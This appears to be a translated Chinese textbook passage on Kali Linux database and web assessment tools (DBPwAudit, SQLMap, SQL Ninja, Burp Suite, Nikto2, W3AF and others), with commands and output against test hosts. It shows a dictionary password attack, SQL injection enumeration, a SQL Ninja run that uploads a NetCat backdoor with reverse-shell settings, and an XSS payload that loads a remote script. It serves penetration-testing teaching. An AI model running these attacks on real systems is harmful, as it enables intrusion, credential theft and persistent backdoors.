本節將介紹 Kali Linux 的三款資料庫分析工具。這三款分析工具分別用於 MS-SQL、MySQL 和 Oracle 資料庫的安全測試。本文會逐一演示它們的基本功能和功能。這些工具主要用於資料庫的指紋指紋、服務枚舉、密碼審計，以及評估目標系統遭受SQL注入攻擊的可能性。審計人員可利用這些工具掌握前端的Web漏洞，並同時發現後臺資料庫的安全弱點。

如需詳細瞭解 SQL 諸如攻擊及有關類型，請參見 http:// hakipedia.com/index.php/SQL_Injection。

1．DBPwAudit

DBPwAudit是一款審計Oracle、MySQL、MS-SQL 和IBM DB2 伺服器密碼安全性的工具，它是Java程式。這款工具大幅度地簡化了使用新資料庫（評估）技術的難度。在目標系統沒有採用強式密碼安全性原則的情況下，它可説明滲透測試人員找到資料庫管理系統的有效帳戶。目前，它支援字典式密碼攻擊機制。

如需啟動 DBPwAudit 程式，可在桌面功能表裡依次選中 Kali Linux | Vulnerability Analysis | Database Assessment | dbpwaudit，或者在shell 中使用下述指令。

cd /usr/share/dbpwaudit/
dbpwaudit
上述指令將在螢幕上顯示程式的所有選項及使用說明。如需知道DBPwAudit可以驅動的資料庫類型，可使用下述指令。

dbpwaudit -L
上述指令將列出該程式可以審計的資料庫類型。特別要注意資料庫系統的別名（aliases），在命令列中指定資料庫類型時要使用資料庫的別名。

本文將演示該程式審計MySQL資料的方法。在此之前，我們首先要安裝好MySQL驅動程式。在安裝好MySQL驅動程式之後，我們可測試目標資料庫系統是否含有常見帳戶。在進行字典式測試之前，我們需要提前準備好兩個字典檔，即users.txt和passwwords.txt。然後使用下述指令。

dbpwaudit -s 10.2.251.24 -d pokeronline -D MySQL -U \ users.txt –P
passwords.txt

DBPwAudit v0.8 by Patrik Karlsson [email protected]

[Tue Sep 14 17:55:41 UTC 2013] Starting password audit ...

[Tue Sep 14 17:55:41 UTC 2013] Testing user: root, pass: admin123

[Tue Sep 14 17:55:41 UTC 2013] Testing user: pokertab, pass: admin123

ERROR: message: Access denied for user 'root'@'10.2.206.18' (using password: YES), code: 1045

[Tue Sep 14 17:55:50 UTC 2013] Testing user: root, pass: RolVer123

ERROR: message: Access denied for user 'pokertab'@'10.2.206.18' (using password: YES), code: 1045

[Tue Sep 14 17:55:56 UTC 2013] Testing user: pokertab, pass: RolVer123

...

[Tue Sep 14 17:56:51 UTC 2013] Finnishing password audit ...

Results for password scan against 10.2.251.24 using provider MySQL

user: pokertab pass: RolVer123

Tested 12 passwords in 69.823 seconds (0.17186314tries/sec)

上面資訊表明，該程式成功地發現了一個有效的用戶帳戶。上述指令中，-d 選項代表目標資料庫的名稱，-D 選項用於指定相應的資料庫管理系統（DBMS）。-U 選項指定用戶名字典，-P選項則用來指定採用的密碼字典。

2．SQLMap

SQLMap是一款先進的自動執行SQL注入的審計工具。針對指定的URL，它可以掃描、發現並利用SQL注入漏洞。目前，SQLMap支援的資料庫管理系統包括MS-SQL、MySQL、Oracle和PostgreSQL。略微處理之後，它也能夠識別諸如DB2、Informix、Sybase、Interbase和 MS Access 之類的資料庫系統。SQLMap 採用4種獨特的 SQL 注入技術，分別是SQL盲注、聯合査詢SQL注入、累加式注入（stacked query）和基於時間的SQL盲注入。它功能廣泛，可對資料庫進行指紋識別、服務枚舉、資料提取，並可訪問目標主機的檔案系統，在獲取完全操作權時甚至可以執行任意命令。此外，該工具還可以從Burp Proxy或Web Scarab的日誌，以及標準的文字檔中解析測試目標的清單。它還能夠調用Google dorks 的分類資料，使用Google搜尋引擎搜索指定目標的可測試網址。

如需深入瞭解 Google dorks 的各種用法，請訪問 Google HackingDatabase 的官方網址：http://www.hackersforcharity.org/ghdb/。

如需啟動SQLMap 程式，可在桌面功能表裡依次選中Kali Linux | Vulnerability Analysis |Database Assessment | sqlmap，或者在shell 中使用下述指令。

cd /usr/share/sqlmap/
sqlmap -h
上述命令將顯示所有可用的選項。這些選項可以分為11個邏輯分類，即目標規格、連接請求參數、注入payload、注入技術、指紋識別、枚舉選項、使用者自訂函數（UDF）注入、檔案系統訪問選項、作業系統訪問選項、Windows 註冊表訪問和其他雜項。在下文的這個例子中，我們將使用多個指紋識別類選項和服務枚舉類選項，獲取被測資料庫系統的特徵資訊。

sqlmap -u "http://testphp.example.com/artists.php?artist=2" -p "artist"-f -b --current-user --current-db --dbs --users
...

[*] starting at: 11:21:43

[11:21:43] [INFO] using '/usr/share/sqlmap/output/testphp.example.com/session' as session file

[11:21:43] [INFO] testing connection to the target url

[11:21:45] [INFO] testing if the url is stable, wait a few seconds

[11:21:49] [INFO] url is stable

[11:21:49] [INFO] testing sql injection on GET parameter 'artist' with 0 parenthesis

[11:21:49] [INFO] testing unescaped numeric injection on GET parameter 'artist'

[11:21:51] [INFO] confirming unescaped numeric injection on GET parameter 'artist'

[11:21:53] [INFO] GET parameter 'artist' is unescaped numeric injectable with 0 parenthesis

[11:21:53] [INFO] testing for parenthesis on injectable parameter

[11:21:56] [INFO] the injectable parameter requires 0 parenthesis

[11:21:56] [INFO] testing MySQL

[11:21:57] [INFO] confirming MySQL

[11:21:59] [INFO] retrieved: 2

[11:22:11] [INFO] the back-end DBMS is MySQL

[11:22:11] [INFO] fetching banner

[11:22:11] [INFO] retrieved: 5.0.22-Debian_0ubuntu6.06.6-log

[11:27:36] [INFO] the back-end DBMS operating system is Linux Debian or Ubuntu

...

[11:28:00] [INFO] executing MySQL comment injection fingerprint

web server operating system: Linux Ubuntu 6.10 or 6.06 (Edgy Eft or Dapper Drake)

web application technology: Apache 2.0.55, PHP 5.1.2

back-end DBMS operating system: Linux Debian or Ubuntu

back-end DBMS: active fingerprint: MySQL >= 5.0.11 and < 5.0.38

comment injection fingerprint: MySQL 5.0.22

banner parsing fingerprint: MySQL 5.0.22, logging enabled

html error message fingerprint: MySQL

[11:31:49] [INFO] fetching banner

[11:31:49] [INFO] the back-end DBMS operating system is Linux Debian or Ubuntu

banner:　'5.0.22-Debian_0ubuntu6.06.6-log'

[11:31:49] [INFO] fetching current user

[11:31:49] [INFO] retrieved: [email protected]

current user:　'[email protected]'

[11:34:47] [INFO] fetching current database

[11:34:47] [INFO] retrieved: fanart

current database:　'fanart'

[11:35:57] [INFO] fetching database users

[11:35:57] [INFO] fetching number of database users

[11:35:57] [INFO] retrieved: 1

[11:36:04] [INFO] retrieved: 'fanart'@'localhost'

database management system users [1]:

[*] 'fanart'@'localhost'

[11:39:56] [INFO] fetching database names

[11:39:56] [INFO] fetching number of databases

[11:39:56] [INFO] retrieved: 3

[11:40:05] [INFO] retrieved: information_schema

[11:43:18] [INFO] retrieved: fanart

[11:44:24] [INFO] retrieved: modrewriteShop

available databases [3]:

[*] fanart

[*] information_schema

[*] modrewriteShop

[11:47:05] [INFO] Fetched data logged to text files under '/usr/share/sqlmap/output/testphp.example.com'

...

這一時刻，我們成功地發現了artist參數存在注入問題。上述指令中，-p選項用來指定目標URL裡需要測試的參數。預設情況下，SQLMap會掃描所有可用的參數（GET、POST、HTTPCookie和User-Agent），但是我們通過指定參數（-p"Parameter 1，Parameter 2"）限制了測試對象的範圍。這將提升SQL注入的速度，從而提高訪問後臺資料庫的速度。在下面的測試中，我們使用--tables選項和-D選項，從資料庫fanart中提取所有表的資訊。

sqlmap -u "http://testphp.example.com/artists.php?artist=2" --tables -D fanart -v 0
[*] starting at: 12:03:53

web server operating system: Linux Ubuntu 6.10 or 6.06 (Edgy Eft or Dapper Drake)

web application technology: Apache 2.0.55, PHP 5.1.2

back-end DBMS: MySQL 5

Database: fanart

[7 tables]

+------------+

| artists　|

| carts　　|

| categ　　|

| featured |

| guestbook |

| pictures |

| users　　|

+------------+

上述資訊表明，由於兩次測試都使用了相同的 URL，SQLMap 程式使用了上次會話（session）中提取的指紋資訊，並沒有從頭對資料庫進行測試。這種功能可讓用戶隨時終止並保存測試會話，以便在後續階段繼續此次會話。此處，我們還可以使用--dump或--dump all選項，對資料庫資訊進行自動存儲。這個程式還有其他一些高級選項，例如--os-cmd、--os-shell 或--os-pw 用於可幫助滲透測試者獲得遠端存取系統許可權，並執行任意命令。但是，此類功能僅支援MS-SQL、MySQL和PostgreSQL這三種運行於作業系統的資料庫系統。如果還需要使用SQLMap的其他選項，可參考官方教程中的實例：http://sqlmap. sourceforge.net/doc/ README.html。

Metasploit框架可以支援SQLMap的哪些選項？

SQLMap的--ospwn選項、--os-smbrelay選項、--priv-sec選項和--msf-path選項，都是在資料庫系統的作業系統上執行的指令選項。Metasploit可通過三種payload使用這些選項：shell、互動式命令環境和GUI訪問（VNC）。

3．SQL Ninja

SQL Ninja 是一款SQL 注入的審計工具，專門用於評估後臺資料庫採用MS-SQL Server的Web應用程式。它可通過SQL注入漏洞獲取遠端資料庫伺服器的shell運行許可權，而不是提取資料庫資料的工具。SQL Ninja 的功能有：對伺服器進行指紋識別、暴力破解密碼、提升許可權、上傳後門、直接調用shell、反連方法連接shell（繞過防火牆的技術）、反射shell、DNS隧道、單命令執行等。它還可以與Metasploit進行集成。因此，它不僅是掃描SQL注入漏洞的工具，而且還是利用已知漏洞獲取作業系統存取權限的工具。

SQL Ninja 不是初學者玩的玩具。如果您需要配置並使用這種工具，請詳細閱讀作者的使用說明，在實際應用前充分瞭解這款工具。

如需啟動SQL Ninja，可在桌面功能表裡依次選中Kali Linux | Vulnerability Analysis |Database Assessment | sqlninja，或者在shell 中使用下述指令。

sqlninja
上述指令將在螢幕上顯示程式所有的可用選項。在進行測試前，需要根據已反映目標的情況更改設定檔的參數和利用漏洞的選項。首先，您要將樣本設定檔解壓縮出來，把它重新命名，然後移動到正確的目錄中，進行如下修改。

cd /usr/share/doc/sqlninja/
gzip –d sqlninja.conf.example.gz
cp sqlninja.conf.example.gz /usr/share/sqlninja/sqlninja.conf
然後，我們要修改設定檔，使其符合我們的測試內容。您需要在設定檔中找到下述內容，然後刪除行首的注釋符號，並根據實際情況對有關選項進行調整。

本文根據情況將設定檔的下述內容進行了調整。

vim sqlninja.conf
...

Host (required)
host = testasp.example.com

Port (optional, default: 80)
port = 80

Vulnerable page (e.g.: /dir/target.asp)
page = /showforum.asp

stringstart = id=0;

Local host: your IP address (for backscan and revshell modes)
lhost = 192.168.0.3

msfpath = /usr/share/exploits/framework3

Name of the procedure to use/create to launch commands. Default is
"xp_cmdshell". If set to "NULL", openrowset+sp_oacreate will be used
for each command
xp_name = xp_cmdshell

...

在上述設定檔中，我們僅修改了一些必要的參數，其他沒有提及的內容均採用了預設值。另外，在使用SQL Ninja 之前，您還有必要使用其他工具檢查SQL 注入的漏洞。在配置好設定檔之後，您就可以使用它的攻擊模式-m t/test 對目標進行檢測。

sqlninja -m t
Sqlninja rel. 0.2.3

Copyright (C) 2006-2008 icesurfer [email protected]

[+] Parsing configuration file................

[+] Target is: testasp.targetdomain.com

[+] Trying to inject a 'waitfor delay'....

[+] Injection was successful! Let's rock !! :)

...

可見，程式成功地識別出了設定檔的各種設置，而且盲注測試取得了成功。接下來，我們可以對目標進行指紋識別，以獲取SQLServer的更多資訊，並取得目標作業系統的操作許可權。

sqlninja -m f
Sqlninja rel. 0.2.3

Copyright (C) 2006-2008 icesurfer [email protected]

[+] Parsing configuration file................

[+] Target is: testasp.example.com

What do you want to discover ?

0 - Database version (2000/2005)

1 - Database user

2 - Database user rights

3 - Whether xp_cmdshell is working

4 - Whether mixed or Windows-only authentication is used

a - All of the above

h - Print this menu

q - exit

a

[+] Checking SQL Server version...

Target: Microsoft SQL Server 2005

[+] Checking whether we are sysadmin...

No, we are not 'sa'.... :/

[+] Finding dbuser length...

Got it ! Length = 8

[+] Now going for the characters........

DB User is....: achcMiU9

[+] Checking whether user is member of sysadmin server role....

You are an administrator !

[+] Checking whether xp_cmdshell is available

xp_cmdshell seems to be available :)

Mixed authentication seems to be used

q

...

上述資訊表明，目標系統存在漏洞，其指定的資料庫安全性原則並不夠安全。我們有機會上傳NetCat的後門程式，繼而獲取被攻陷主機的長期控制權，並可通過它的shell執行任意的指令。此時，人們常用Metasploit的攻擊模式進行進一步的滲透。

sqlninja -m u
Sqlninja rel. 0.2.3

Copyright (C) 2006-2008 icesurfer [email protected]

[+] Parsing configuration file................

[+] Target is: testasp.targetdomain.com

File to upload:

shortcuts: 1=scripts/nc.scr 2=scripts/dnstun.scr

1

[+] Uploading scripts/nc.scr debug script............

1540/1540 lines written

done !

[+] Converting script to executable... might take a while

[+] Completed: nc.exe is uploaded and available !

至此，我們巳經成功上傳後門。然後我們可通過該後門獲得 s/dirshell、k/backscan或r/revshell。此外，採用m/metasploit的髙級選項可以使用Metasploit 框架的SQLNinja封裝程式訪問目標主機的GUI。如需詳細瞭解SQLNinja的使用方法或它的設定檔，請訪問http://sqlninja.source forge.net/sqlninja-howto.html。

7.8.2 Web應用程式評估工具
本節介紹的工具主要關注Web基礎設施前端程式的安全性。它們都可以識別、分析並利用應用程式的安全性漏洞。這些漏洞包括緩衝區溢位、跨站腳本（XSS）、SQL 注入、SSI 注入、XML注入、應用配置錯誤、功能濫用、會話預測、資訊洩露以及許多其他類型的漏洞。7.2節已經討論過，應用程式漏洞有多種分類標準。如需更深入瞭解這些漏洞的特性，強烈建議讀者掌握上述漏洞分類標準。

1．Burp Suite

Burp Suite組合了一系列功能強大的Web應用程式的安全工具。這些工具能夠演示攻擊人員對Web應用程式的滲透方法。它們能夠或手動或自動地掃描、分析並利用Web應用程式的安全性漏洞。Burp Suit將有關工具整合為一體，能夠在多個工具之間傳遞和共用資訊，成為了一個完整的攻擊平臺。這一特性使得Burp Suite成為了簡單有效的Web應用程式攻擊框架。

如需啟動Burp Suit，可在桌面功能表裡依次選中Kali Linux | Web Applications | Web Vulnerability Scanners | burpsuite，或在終端中使用下述指令。

burpsuite
上述指令將在螢幕上顯示Burp Suite 的程式視窗。您可以通過對應的選項卡訪問它所集成的全部工具（Target、Proxy、Spider、Scanner、Intruder、Repeater、Sequencer、Decoder和Comparer）。如需瞭解它們的用法和配置等詳細資訊，可以使用Help功能表或者訪問http://www.portswigger.net/suite/help.html。本例將使用Burp Suite的多個工具分析小型的Web 應用程式。要注意，Burp Suite 有兩個版本：免費版和商業版。Kali Linux 收錄的版本是它的免費版，因此有些功能受到限制。使用Burp Suite 檢查SQL注入漏洞的相應步驟如下。

1. 首先，選擇Proxy | Options，檢查proxy listeners的屬性。本例採用程式的預設設置，即監聽 8080 埠。您還可以根據評估任務的實際情況設置這個介面的其他選項，例如主機重定向、SSL證書、用戶端請求攔截、伺服器回應攔截、頁面屬性和請求頭修改等。

2. 選擇Proxy | Intercept，選中intercept is on標籤。

3. 打開你最習慣的流覽器（例如Firefox），並設置HTTP/HTTPS 協定的代理伺服器為本地代理（127.0.0.1, 8080）。代理伺服器能夠攔截、檢查並修改流覽器發往目標Web應用程式之間的用戶端請求，並且能夠記錄伺服器發回的所有回應。在這種設置中，Burp Suite 的功能類似中間人代理伺服器。

4. 流覽目標網站（例如，http: //testphp.targetdomain.com），您可在Burp Suite 的Proxy | Intercept選項卡中看到流覽器發送的請求資料（http request）。在本例中，我們不對流覽器請求進行任何修改，直接轉發這個請求。如需修改請求，可以在Raw、Headers或者Hex選項卡中修改。清注意，在訪問索引頁（index）等網頁時，流覽器會對網頁中的各種資源（例如圖像、Flash檔）發送單獨的獲取請求。

5. 在此，強烈建議訪問盡可能多的網頁，以幫助Burp Suite列出可用頁的GET和POST 請求。當然，也可以使用程式的 Spider 功能自動完成分析過程。如需使用 Spider的爬蟲功能，可在功能表中選中 Target｜Site Map，右鍵點擊目標網址（本例是http://testphp.examples.com），然後選擇spider this host。此後，程式將會自動發現、掃描可用頁面；當遇到需要遞交資料的頁面（例如登錄）時，程式將提示您進行人工干預。此操作結束後，可在Target｜Site map選項卡右側的面板中査看可訪問網頁清單和頁面屬性（方法、URL、參數、回應碼等）。

6. 您可選擇一個採用GET或POST 模式傳遞參數的頁面，用Intruder 進行測試。關鍵是要找到可能的參數識別字，獲取有用資料，並對這些參數進行模糊測試，以檢測已知漏洞。按右鍵選定的請求，並選擇 send to intruder。本例測試的網址是http://testphp.targetdomain.com/listproducts. php?artist=2；程式將以不同長度的字元替代2，以找到已知的漏洞。

7. 接下來，我們要指定攻擊類型以及有效載荷（payload）的位置（Intruder | Positions），以進行自動測試。有效載荷的位置有§2§標識。然後，我們通過功能表進入 Intruder | Payloads，從預定義字元塊清單中選擇預定義的有效載荷（payload），本例選擇Character blocks。當然，您還可以指定自訂的有效載荷。設置完畢後，選擇功能表Intruder | Start 執行測試任務。此時，程式將會在彈出的視窗裡顯示測試目標應用程式時發送的全部請求。待程式處理完所有指定的有效載荷之後，我們可通過遠端回應的比較結果判斷Web應用程式的意外行為。使用滑鼠右鍵點擊選定的請求並選擇send response to comparer，即可對回應進行比較。Burp Suite 可以對兩個（或更多）的請求或回應進行逐字逐節（bytes和words）的比較。如需詳細瞭解各種攻擊類型，請訪問 http://www.portswigger.net/burp/help/intruder_positions. html#attacktype；如需瞭解有關有效載荷選項的更多資訊，請訪問 http://www.portswigger.net/burp/help/ intruder_payloads_types.html。

8. 在比較響應的過程中，我們發現其中一個有效載荷請求存在 SQL 注入漏洞。為了驗證其真實性，我們決定使用 Repeater 重現該請求。即使用滑鼠右鍵點擊該請求，然後選擇 send request to repeater，之後按一下 Repeater 選項卡中的 go 按鈕，將會立即獲取指定請求的遠程回應。在本例中，我們注意到響應頁面中的下述錯誤資訊。

Error: Unknown column 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAA' in 'where clause'

Warning : mysql_fetch_array(): supplied argument is not a valid MySQL result resource in /var/www/vhosts/default/htdocs/listproducts.php on line 74

9. 上述資訊是SQL 注入漏洞的典型特徵。除了檢驗這種類型的安全問題，我們還可以使用Burp Suite 的sequencer 測試應用程式session tokens的散化程度，檢測session的可預測問題。有關sequencer的基本用法，請參見http://www.portswigger. net/suite/sequencerhelp.html。

Burp Suite 是款多功能的Web 應用程式安全工具。它是應用廣泛、功能強大的Web應用程式攻擊平臺。篇幅所限，本文不逐一介紹它的各個功能。所以，我們強烈建議您通過它的官方網站（http://www.portswigger.net/）詳細瞭解它的各種用法。

2．Nikto2

Nikto2是一款基礎的Web伺服器安全掃描工具。它可以掃描、檢測由下述問題引起的的安全性漏洞：伺服器的配置不當問題、預設和不安全的檔、過舊的服務端應用程式。Nikto2程式完全是LibWhisker2的再開發版。因此，它支持跨平臺部署、SSL、常見的主機身份驗證方式（NTLM/Basic）、多代理，並採用了多種 IDS 規避技術。它還支援子功能變數名稱枚舉、應用程式安全檢査（XSS、SQL注入等），並能夠使用字典的攻擊方法猜測認證資訊。

如需啟動Niklo2 程式，可在桌面功能表裡依次選中Kali Linux | Web Applications | Web Vulnerability Scanners | nikto，或者在終端中使用下述指令。

nikto
上述指令將顯示其所有選項及其擴展特性。在本例中，我們使用-T選項對目標主機執行一組特定的測試。有關各個選項的詳細說明和使用方法，請訪問 http://cirt.net/nikto2-docs/。

nikto -h testphp.example.com -p 80 -T 3478b -t 3 -D \ V -o webtest –F
htm

Nikto v2.1.5
V:Sat Sep 18 14:39:37 2013 - Initialising plugin nikto_apache_expect_xss

V:Sat Sep 18 14:39:37 2013 - Loaded "Apache Expect XSS" plugin.

V:Sat Sep 18 14:39:37 2013 - Initialising plugin nikto_apacheusers

V:Sat Sep 18 14:39:37 2013 - Loaded "Apache Users" plugin.

V:Sat Sep 18 14:39:37 2013 - Initialising plugin nikto_cgi

V:Sat Sep 18 14:39:37 2013 - Loaded "CGI" plugin.

V:Sat Sep 18 14:39:37 2013 - Initialising plugin nikto_core

V:Sat Sep 18 14:39:37 2013 - Initialising plugin nikto_dictionary_attack

...

V:Sat Sep 18 14:39:38 2013 - Checking for HTTP on port 10.2.87.158:80, using HEAD

V:Sat Sep 18 14:39:38 2013 - Opening reports

V:Sat Sep 18 14:39:38 2013 - Opening report for "Report as HTML" plugin

Target IP:　　　10.2.87.158

Target Hostname:　testphp.example.com

Target Port:　　80

Start Time:　　2013-09-19 14:39:38

Server: Apache/2.0.55 (Ubuntu) modpython/3.1.4 Python/2.4.3 PHP/5.1.2 mod ssl/2.0.55 OpenSSL/0.9.8a mod_perl/2.0.2 Perl/v5.8.7
V:Sat Sep 18 14:39:40 2013 - 21 server checks loaded

V:Sat Sep 18 14:39:41 2013 - Testing error for file: /.g89xvYXD

...

OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
V:Sat Sep 18 14:40:49 2013 - Running scan for "Server Messages" plugin

OSVDB-0: mod_ssl/2.0.55 OpenSSL/0.9.8a mod_perl/2.0.2 Perl/v5.8.7 –mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell (difficult to exploit). http://cve.mitre.org/cgi-bin/cvename.cgi?name= CVE-2002-0082, OSVDB-756.
...

V:Sat Sep 18 14:41:04 2013 - 404 for GET:　　/tiki/tiki-install.php

V:Sat Sep 18 14:41:05 2013 - 404 for GET:　　/scripts/samples/details.idc

21 items checked: 15 item(s) reported on remote host

End Time:　　　2013-09-19 14:41:05 (87 seconds)

1 host(s) tested
V:Sat Sep 18 14:41:05 2013 + 135 requests made

上述指令中，-T 選項指定測試類型為 Information Disclosure（資訊洩露）、Injection （XSS/Script/HTML）、Remote File Retrieval（Server Wide）、Command Execution 和Software Identification（軟體識別）；-t 選項控制每個測試類型執行的超時時間：-DV 選項控制顯示格式；-o和-F選項用於定義掃描報告以特定的格式和編寫。Nikto還有其他的選項，例如-mutate（猜測子域、檔、目錄、用戶名）、-evasion（規避IDS檢測）和-Single （單組規則測試模式），都可以用來進行更為深入的安全評估。

3．Paros Proxy

Paros Proxy 是一款名不見經傳的深入分析安全性漏洞的評估工具。它能以爬蟲方式分析整個網站的網址，並執行各種漏洞測試。同時，審計人員還可以利用它的代理伺服器功能攔截本機流覽器和目標應用程式伺服器之間的Web流量（支援HTTP/HTTPS協定）。審計人員可以利用這種機制修改本機發往目標服務程式的特定請求，從而進行手工測試。因此， Paros Proxy不僅是Web 應用程式安全評估的主動評估工具，而且還是它的被動評估工具。

如需啟動Paros Proxy程式，可在桌面功能表裡依次選中Kali Linux | Web Applications |Web Application Proxies | Paros，或者在終端中使用下述指令。

paros
上述指令將載入Paros Proxy程式的圖形視窗。在開始測試前，你需要在流覽器中設置本地代理，即設置代理的 IP 為 127.0.0.1，埠為 8080。如需調整預設設置，可在菜單Tools | Options中調整連接設置、本地代理的設置、HTTP認證和其他相關設置。在設置好流覽器之後，就可以訪問目標網頁了。使用Paros Proxy進行漏洞測試的具體步驟如下。

1. 在本例中，我們訪問http://testphp.targetdomain.com。此後，Paros Proxy的Sites選項卡裡顯示這個網址。

2. 使用滑鼠按右鍵http://testphp.targetdomain.com 並選擇Spider，以爬蟲方式分析整個網站的網址。掃描網址的時間取決於網站的頁面數量。

3. 在程式抓取完網址之後，您可通過底部的Spider 標籤査看所有抓取到的網址資訊。此外，也可以通過在Sites選項卡中選擇特定網站的網頁，以跟蹤其請求和回應。

4. 您在右側面板中的 Trap 選項卡中，調查特定的請求和回應的回應。在對目標應用程式進行手動測試時，這項功能尤其有用。此外，您可通過功能表 Tools | Manual Request Editor，手工構建一個HTTP請求。

5. 在 Sites 選項卡裡選中目標網站，然後在功能表中選擇 Analyze | Scan All，可對選定網站進行自動化的漏洞測試。另外，您還可以在 Analyze | Scan Policy 指定安全測試的特定類型，然後使用單獨的 Analyze | Scan 功能進行特定類型的安全測試（而不是Scan All 進行的那種全面測試）。

6. 在程式完成漏洞測試之後，您可在底部的Alerts 選項卡中看到大量的安全警告。依照其危害程度，這些漏洞被分為High、Low和Medium三種級別。

7. 如需查看上次掃描結果的報告，可打開菜單Report | Last Scan Report。它將會把本此測試發現的所有漏洞保存為網頁格式檔/root/paros/session/LatestScannedReport.htm。

在本例中，我們僅進行了基本的漏洞評估測試。如需獲取Paros Proxy選項的詳細說明，請訪問其官方的用戶手冊，位址為 http://www.i-pi.com/Training/SecTesting/paros_user_guide.pdf。

4．W3AF

W3AF是一款功能豐富的Web應用程式攻擊和審計框架，它主要用於探測和利用Web漏洞。它實現了全自動化的應用程式安全評估過程。整個框架的設計理念遵循了下述三個主要的操作步驟：識別、審計和攻擊。在進行毎個操作步驟時，審計員都可使用其提供的注重特定測試標準的功能外掛程式。W3AF 的這些外掛程式實現了互相之間的通信和資料共用，有助於協同完成測試任務。它可檢査、利用的Web應用程式漏洞包括SQL注入、跨站腳本、遠端和本地檔包含、緩衝區溢位、XPath 注入、作業系統命令、錯誤的應用配置等。有關各個外掛程式的詳細資訊，請查詢http://w3af.sourceforge.net/plugin-descriptions.php。

如需啟動 W3AF，可在桌面功能表中依次選中 Kali Linux | Web Applications | Web Vulnerability Scanners | w3af (Console)，或在終端中使用下述指令。

w3af_console
上述命令將進入到W3AF特有的控制台模式（提示符為w3af>>>）。雖然在桌面功能表裡也有這個程式的GUI版本，但是考慮到操作靈活性，我們傾向於使用它的控制台版本。

w3af>>> help

上述指令將顯示配置w3af測試所需的基本選項。在需要查看説明時，可隨時使用help命令查看特定選項的說明資訊。本例首先配置output 外掛程式，然後啟用特定的audit 測試選項，設置target並對目標網站進行掃描。相關指令如下。

w3af>>> plugins

w3af/plugins>>> help

w3af/plugins>>> output

w3af/plugins>>> output console, htmlFile

w3af/plugins>>> output config htmlFile

w3af/plugins/output/config:htmlFile>>> help

w3af/plugins/output/config:htmlFile>>> view

w3af/plugins/output/config:htmlFile>>> set verbose True

w3af/plugins/output/config:htmlFile>>> set fileName testreport.html

w3af/plugins/output/config:htmlFile>>> back

w3af/plugins>>> output config console

w3af/plugins/output/config:console>>> help

w3af/plugins/output/config:console>>> view

w3af/plugins/output/config:console>>> set verbose False

w3af/plugins/output/config:console>>> back

w3af/plugins>>> audit

w3af/plugins>>> audit htaccessMethods, osCommanding, sqli, xss

w3af/plugins>>> back

w3af>>> target

w3af/config:target>>> help

w3af/config:target>>> view

w3af/config:target>>> set target http://testphp.example.com/

w3af/config:target>>> back

w3af>>>

我們通過上述指令調整好了各項參數。然後，我們將通過下述指令，評估目標的 SQL注入、跨站腳本、作業系統命令、htaccess錯誤配置等漏洞的安全問題。

w3af>>> start

Auto-enabling plugin: grep.error500

Auto-enabling plugin: grep.httpAuthDetect

Found 2 URLs and 2 different points of injection.

The list of URLs is:

http://testphp.example.com/

http://testphp.example.com/search.php?test=query

The list of fuzzable requests is:

http://testphp.example.com/ | Method: GET

http://testphp.example.com/search.php?test=query| Method: POST|Parameters:(searchFor="")

Starting sqli plugin execution.

Starting osCommanding plugin execution.

A possible OS Commanding was found at:

"http://testphp.example.com/search.php?test=query", using

HTTP method POST. The sent post-data was:

"searchFor=run+ping+-n+3+localhost＆goButton=go".Please review manually.

This information was found in the request with id 22.

Starting xss plugin execution.

Cross Site Scripting was found at:

"http://testphp.example.com/search.php?test=query",

using HTTP method POST. The sent post-data was:

"searchFor=ScRIPt/SrC=http://x4Xp/x.js</ScRIPt>＆goButton=go".

This vulnerability affects Internet Explorer 6,Internet Explorer 7,Netscape with IE rendering engine,Mozilla Firefox,Netscape with

Gecko rendering engine.

This vulnerability was found in the request with id 39.

Starting htaccessMethods plugin execution.

Finished scanning process.

上述資訊表明，W3AF發現該Web應用程式存在多個嚴重的安全性漏洞。我們已經在配置中指定好了測試報告的檔案名，該文件位於/pentest/web/w3af/testreport. html。掃描報告會列出所有漏洞的全部細節，其中包括 W3AF 程式和目標 Web 應用程式之間每個請求資訊、相應回應、所傳遞的資料以及調試資訊等。本例沒有使用別的的外掛程式（plugins）、設定檔（profiles）和漏洞利用（exploit）選項。因此，本書強烈建議讀者參考官方的使用者指南，進行各種練習。官方手冊的下載網址是 http://w3af. sourceforge.net/documentation/user/w3afUsersGuide.pdf。

5．WafW00f

WafW00f是檢測Web應用程式防火牆（WAF）的Python腳本程式。在評估WAF保護的目標主機時，許多漏洞評估技術都難以奏效；而這正是WafW00f程式擅長的測試環境。部署于應用伺服器和Internet流量之間的WAF防火牆，不僅提高了測試策略的難度，同時還使滲透測試人員開發的高級規避技術面臨了新的挑戰。

如需啟動WafW00f程式，可在終端中使用下述指令。

wafw00f
上述指令將在顯示器上顯示簡單的使用說明，以及幾個典型的指令範例。本例中，我們將通過下述指令，分析目標網站是否使用WAF系統。

wafw00f http://www.example.net/
WAFW00F - Web Application Firewall Detection Tool

By Sandro Gauci ＆＆ Wendel G. Henrique

Checking http://www.example.net/

The site http://www.example.net/ is behind a dotDefender

Number of requests: 5

上述資訊表明，目標應用程式伺服器處於防火牆的保護之下（例如，dotDefender）。通過這些資訊，我們可以進一步地調查規避WAF規則的方法。這可能涉及一些如HTTP參數污染、空位元組替換、規範化處理、使用十六進位字元或Unicode字元對惡意URL進行編碼等技術。

6．WebScarab

WebScarab 是一款功能強大的 Web 應用程式的安全評估工具。它有多種操作模式，主要模式為攔截代理。將WebScarab代理部署於終端使用者流覽器和目標Web應用程式之間，可監控、修改二者之間的請求和回應。審計人員可以手動構造連接請求，然後檢査目標Web應用程式返回的回應資訊。WebScarab 集成了諸多工具，這些工具包括 fuzzer、session ID analysis、spider、web services analyzer、XSS 和 CRLF 漏洞掃描器和 transcoder等程式。

如需啟動WebScarab Lite程式，可在桌面功能表裡依次選中Kali Linux | WebApplications |Web Vulnerability Scanners | webscarab，或在終端中使用下述指令。

webscarab
